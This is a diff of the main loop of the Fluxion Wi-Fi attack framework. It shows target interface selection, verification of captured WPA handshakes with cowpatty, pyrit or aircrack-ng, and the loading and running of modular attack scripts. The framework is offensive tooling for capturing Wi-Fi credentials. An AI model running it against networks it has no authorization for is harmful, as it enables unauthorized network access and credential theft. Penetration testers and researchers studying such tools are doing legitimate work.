+    # the environment based on either the ESSID or BSSID, & autofill.
+    echo -e "$FLUXIONVLine $FLUXIONIncompleteTargettingInfoNotice"
+    sleep 3
+  fi
+
+  if ! fluxion_get_interface attack_targetting_interfaces \
+    "$FLUXIONTargetSearchingInterfaceQuery"; then
+    return 2
+  fi
+
+  if ! fluxion_allocate_interface $FluxionInterfaceSelected; then
+    return 3
+  fi
+
+  if ! fluxion_get_target \
+    ${FluxionInterfaces[$FluxionInterfaceSelected]}; then
+    return 4
+  fi
+}
 
 
-######################################### < INTERFACE WEB > ########################################
-top && setresolution && setinterface
+# =================== < Hash Subroutines > =================== #
+# Parameters: <hash path> <bssid> <essid> [channel [encryption [maker]]]
+fluxion_hash_verify() {
+  if [ ${#@} -lt 3 ]; then return 1; fi
+
+  local -r hashPath=$1
+  local -r hashBSSID=$2
+  local -r hashESSID=$3
+  local -r hashChannel=$4
+  local -r hashEncryption=$5
+  local -r hashMaker=$6
+
+  if [ ! -f "$hashPath" -o ! -s "$hashPath" ]; then
+    echo -e "$FLUXIONVLine $FLUXIONHashFileDoesNotExistError"
+    sleep 3
+    return 2
+  fi
+
+  if [ "$FLUXIONAuto" ]; then
+    local -r verifier="cowpatty"
+  else
+    fluxion_header
+
+    echo -e "$FLUXIONVLine $FLUXIONHashVerificationMethodQuery"
+    echo
+
+    fluxion_target_show
+
+    local choices=( \
+      "$FLUXIONHashVerificationMethodPyritOption" \
+      "$FLUXIONHashVerificationMethodAircrackOption" \
+      "$FLUXIONHashVerificationMethodCowpattyOption" \
+      "$FLUXIONGeneralBackOption" \
+    )
+
+    io_query_choice "" choices[@]
+
+    echo
+
+    case "$IOQueryChoice" in
+      "$FLUXIONHashVerificationMethodPyritOption")
+        local -r verifier="pyrit" ;;
+
+      "$FLUXIONHashVerificationMethodAircrackOption")
+        local -r verifier="aircrack-ng" ;;
+
+      "$FLUXIONHashVerificationMethodCowpattyOption")
+        local -r verifier="cowpatty" ;;
+
+      "$FLUXIONGeneralBackOption")
+        return -1 ;;
+    esac
+  fi
+
+  hash_check_handshake \
+    "$verifier" \
+    "$hashPath" \
+    "$hashESSID" \
+    "$hashBSSID"
+
+  local -r hashResult=$?
+
+  # A value other than 0 means there's an issue with the hash.
+  if [ $hashResult -ne 0 ]; then
+    echo -e "$FLUXIONVLine $FLUXIONHashInvalidError"
+  else
+    echo -e "$FLUXIONVLine $FLUXIONHashValidNotice"
+  fi
+
+  sleep 3
+
+  if [ $hashResult -ne 0 ]; then return 1; fi
+}
+
+fluxion_hash_unset_path() {
+  if [ ! "$FluxionHashPath" ]; then return 1; fi
+  FluxionHashPath=""
+
+  # Since we're auto-selecting when on auto, trigger undo-chain.
+  if [ "$FLUXIONAuto" ]; then return 2; fi
+}
+
+# Parameters: <hash path> <bssid> <essid> [channel [encryption [maker]]]
+fluxion_hash_set_path() {
+  if [ "$FluxionHashPath" ]; then return 0; fi
+
+  fluxion_hash_unset_path
+
+  local -r hashPath=$1
+
+  # If we've got a default path, check if a hash exists.
+  # If one exists, ask users if they'd like to use it.
+  if [ "$hashPath" -a -f "$hashPath" -a -s "$hashPath" ]; then
+    if [ "$FLUXIONAuto" ]; then
+      FluxionHashPath=$hashPath
+      return
+    else
+      local choices=( \
+        "$FLUXIONUseFoundHashOption" \
+        "$FLUXIONSpecifyHashPathOption" \
+        "$FLUXIONHashSourceRescanOption" \
+        "$FLUXIONGeneralBackOption" \
+      )
+
+      fluxion_header
+
+      echo -e "$FLUXIONVLine $FLUXIONFoundHashNotice"
+      echo -e "$FLUXIONVLine $FLUXIONUseFoundHashQuery"
+      echo
+
+      io_query_choice "" choices[@]
+
+      echo
+
+      case "$IOQueryChoice" in
+        "$FLUXIONUseFoundHashOption")
+          FluxionHashPath=$hashPath
+          return ;;
+
+        "$FLUXIONHashSourceRescanOption")
+          fluxion_hash_set_path "$@"
+          return $? ;;
+
+        "$FLUXIONGeneralBackOption")
+          return -1 ;;
+      esac
+    fi
+  fi
+
+  while [ ! "$FluxionHashPath" ]; do
+    fluxion_header
+
+    echo
+    echo -e "$FLUXIONVLine $FLUXIONPathToHandshakeFileQuery"
+    echo -e "$FLUXIONVLine $FLUXIONPathToHandshakeFileReturnTip"
+    echo
+    echo -ne "$FLUXIONAbsolutePathInfo: "
+    read FluxionHashPath
+
+    # Back-track when the user leaves the hash path blank.
+    # Notice: Path is cleared if we return, no need to unset.
+    if [ ! "$FluxionHashPath" ]; then return 1; fi
+
+    # Make sure the path points to a valid generic file.
+    if [ ! -f "$FluxionHashPath" -o ! -s "$FluxionHashPath" ]; then
+      echo -e "$FLUXIONVLine $FLUXIONEmptyOrNonExistentHashError"
+      sleep 5
+      fluxion_hash_unset_path
+    fi
+  done
+}
+
+# Paramters: <defaultHashPath> <bssid> <essid>
+fluxion_hash_get_path() {
+  # Assure we've got the bssid and the essid passed in.
+  if [ ${#@} -lt 2 ]; then return 1; fi
+
+  while true; do
+    fluxion_hash_unset_path
+    if ! fluxion_hash_set_path "$@"; then
+      return -1 # WARNING: The recent error code is NOT contained in $? here!
+    fi
+
+    if fluxion_hash_verify "$FluxionHashPath" "$2" "$3"; then
+      break;
+    fi
+  done
+
+  # At this point FluxionHashPath will be set and ready.
+}
+
+
+# ================== < Attack Subroutines > ================== #
+fluxion_unset_attack() {
+  local -r attackWasSet=${FluxionAttack:+1}
+  FluxionAttack=""
+  if [ ! "$attackWasSet" ]; then return 1; fi
+}
+
+fluxion_set_attack() {
+  if [ "$FluxionAttack" ]; then return 0; fi
+
+  fluxion_unset_attack
+
+  fluxion_header
+
+  echo -e "$FLUXIONVLine $FLUXIONAttackQuery"
+  echo
+
+  fluxion_target_show
+
+  local attacks
+  readarray -t attacks < <(ls -1 "$FLUXIONPath/attacks")
+
+  local descriptions
+  readarray -t descriptions < <(
+    head -n 3 "$FLUXIONPath/attacks/"*"/language/$FluxionLanguage.sh" | \
+    grep -E "^# description: " | sed -E 's/# \w+: //'
+  )
+
+  local identifiers=()
+
+  local attack
+  for attack in "${attacks[@]}"; do
+    local identifier=$(
+      head -n 3 "$FLUXIONPath/attacks/$attack/language/$FluxionLanguage.sh" | \
+      grep -E "^# identifier: " | sed -E 's/# \w+: //'
+    )
+    if [ "$identifier" ]; then
+      identifiers+=("$identifier")
+    else
+      identifiers+=("$attack")
+    fi
+  done
+
+  attacks+=("$FLUXIONGeneralBackOption")
+  identifiers+=("$FLUXIONGeneralBackOption")
+  descriptions+=("")
+
+  io_query_format_fields "" \
+    "\t$CRed[$CSYel%d$CClr$CRed]$CClr%0.0s $CCyn%b$CClr %b\n" \
+    attacks[@] identifiers[@] descriptions[@]
+
+  echo
+
+  if [ "${IOQueryFormatFields[1]}" = "$FLUXIONGeneralBackOption" ]; then
+    return -1
+  fi
+
+  if [ "${IOQueryFormatFields[1]}" = "$FLUXIONAttackRestartOption" ]; then
+    return 2
+  fi
+
+
+  FluxionAttack=${IOQueryFormatFields[0]}
+}
+
+fluxion_unprep_attack() {
+  if type -t unprep_attack &> /dev/null; then
+    unprep_attack
+  fi
+
+  IOUtilsHeader="fluxion_header"
+
+  # Remove any lingering targetting subroutines loaded.
+  unset attack_targetting_interfaces
+  unset attack_tracking_interfaces
+
+  # Remove any lingering restoration subroutines loaded.
+  unset load_attack
+  unset save_attack
+
+  FluxionTargetTrackerInterface=""
+
+  return 1 # Trigger another undo since prep isn't significant.
+}
+
+fluxion_prep_attack() {
+  local -r path="$FLUXIONPath/attacks/$FluxionAttack"
+
+  if [ ! -x "$path/attack.sh" ]; then return 1; fi
+  if [ ! -x "$path/language/$FluxionLanguage.sh" ]; then return 2; fi
+
+  # Load attack parameters if any exist.
+  if [ "$AttackCLIArguments" ]; then
+    eval set -- "$AttackCLIArguments"
+    # Remove them after loading them once.
+    unset AttackCLIArguments
+  fi
+
+  # Load attack and its corresponding language file.
+  # Load english by default to overwrite globals that ARE defined.
+  source "$path/language/en.sh"
+  if [ "$FluxionLanguage" != "en" ]; then
+    source "$path/language/$FluxionLanguage.sh"
+  fi
+  source "$path/attack.sh"
+
+  # Check if attack is targetted & set the attack target if so.
+  if type -t attack_targetting_interfaces &> /dev/null; then
+    if ! fluxion_target_set; then return 3; fi
+  fi
+
+  # Check if attack provides tracking interfaces, get & set one.
+  # TODO: Uncomment the lines below after implementation.
+  if type -t attack_tracking_interfaces &> /dev/null; then
+    if ! fluxion_target_set_tracker; then return 4; fi
+  fi
+
+  # If attack is capable of restoration, check for configuration.
+  if type -t load_attack &> /dev/null; then
+    # If configuration file available, check if user wants to restore.
+    if [ -f "$path/attack.conf" ]; then
+      local choices=( \
+        "$FLUXIONAttackRestoreOption" \
+        "$FLUXIONAttackResetOption" \
+      )
+
+      io_query_choice "$FLUXIONAttackResumeQuery" choices[@]
+
+      if [ "$IOQueryChoice" = "$FLUXIONAttackRestoreOption" ]; then
+        load_attack "$path/attack.conf"
+      fi
+    fi
+  fi
+
+  if ! prep_attack; then return 5; fi
+
+  # Save the attack for user's convenience if possible.
+  if type -t save_attack &> /dev/null; then
+    save_attack "$path/attack.conf"
+  fi
+}
+
+fluxion_run_attack() {
+  start_attack
+  fluxion_target_tracker_start
+
+  local choices=( \
+    "$FLUXIONSelectAnotherAttackOption" \
+    "$FLUXIONGeneralExitOption" \
+  )
+
+  io_query_choice \
+    "$(io_dynamic_output $FLUXIONAttackInProgressNotice)" choices[@]
+
+  echo
+
+  # IOQueryChoice is a global, meaning, its value is volatile.
+  # We need to make sure to save the choice before it changes.
+  local choice="$IOQueryChoice"
+
+  fluxion_target_tracker_stop
+
+
+  # could execute twice
+  # but mostly doesn't matter
+  if [ ! -x "$(command -v systemctl)" ]; then
+    if [ "$(systemctl list-units | grep systemd-resolved)" != "" ];then
+        systemctl restart systemd-resolved.service
+    fi
+  fi
+
+  if [ -x "$(command -v service)" ];then
+    if service --status-all | grep -Fq 'systemd-resolved'; then
+      sudo service systemd-resolved.service restart
+    fi
+  fi
+
+  stop_attack
+
+  if [ "$choice" = "$FLUXIONGeneralExitOption" ]; then
+    fluxion_handle_exit
+  fi
+
+  fluxion_unprep_attack
+  fluxion_unset_attack
+}
+
+# ============================================================ #
+# ================= < Argument Executables > ================= #
+# ============================================================ #
+eval set -- "$FLUXIONCLIArguments" # Set environment parameters.
+while [ "$1" != "" -a "$1" != "--" ]; do
+  case "$1" in
+    -t|--target) echo "Not yet implemented!"; sleep 3; fluxion_shutdown;;
+  esac
+  shift # Shift new parameters
+done
+
+# ============================================================ #
+# ===================== < FLUXION Loop > ===================== #
+# ============================================================ #
+fluxion_main() {
+  fluxion_startup
+
+  fluxion_set_resolution
+
+  # Removed read-only due to local constant shadowing bug.
+  # I've reported the bug, we can add it when fixed.
+  local sequence=(
+    "set_language"
+    "set_attack"
+    "prep_attack"
+    "run_attack"
+  )
+
+  while true; do # Fluxion's runtime-loop.
+    fluxion_do_sequence fluxion sequence[@]
+  done
+
+  fluxion_shutdown
+}
+
+fluxion_main # Start Fluxion
+
+# FLUXSCRIPT END
